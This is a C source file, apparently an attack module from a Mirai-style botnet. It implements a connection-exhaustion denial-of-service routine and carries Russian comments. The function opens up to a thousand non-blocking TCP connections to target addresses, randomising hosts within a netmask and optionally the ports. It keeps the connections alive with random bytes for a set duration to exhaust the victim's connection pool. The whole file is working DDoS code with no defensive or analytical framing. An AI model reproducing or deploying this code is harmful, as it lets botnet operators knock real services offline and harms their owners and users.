#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"

void attack_conn_exhaust(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    int max_conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1000);
    int duration = attack_get_opt_int(opts_len, opts, ATK_OPT_DURATION, 60);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);

    int *fds = calloc(max_conns, sizeof(int));
    if (fds == NULL)
        return;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;

    time_t start = time(NULL);

    // создаем максимальное количество соединений
    int idx = 0;
    for (i = 0; i < targs_len && idx < max_conns; i++)
    {
        int r;
        for (r = 0; r < max_conns / targs_len && idx < max_conns; r++)
        {
            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd < 0)
                continue;
            
            // неблокирующий режим
            fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);

            if (targs[i].netmask < 32)
                addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            else
                addr.sin_addr.s_addr = targs[i].addr;
            addr.sin_port = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);

            // пытаемся подключиться
            connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
            fds[idx++] = fd;
        }
    }

    // держим соединения открытыми для исчерпания пула
    while (time(NULL) - start < duration)
    {
        for (i = 0; i < idx; i++)
        {
            if (fds[i] > 0)
            {
                // периодически отправляем keep-alive данные
                char keepalive[32];
                int len = rand_next() % 16 + 8;
                rand_str(keepalive, len);
                send(fds[i], keepalive, len, MSG_NOSIGNAL);
            }
        }
        usleep(rand_next() % 10000 + 5000);
    }

    // закрываем все соединения
    for (i = 0; i < max_conns; i++)
        if (fds[i] > 0) close(fds[i]);
    free(fds);
}
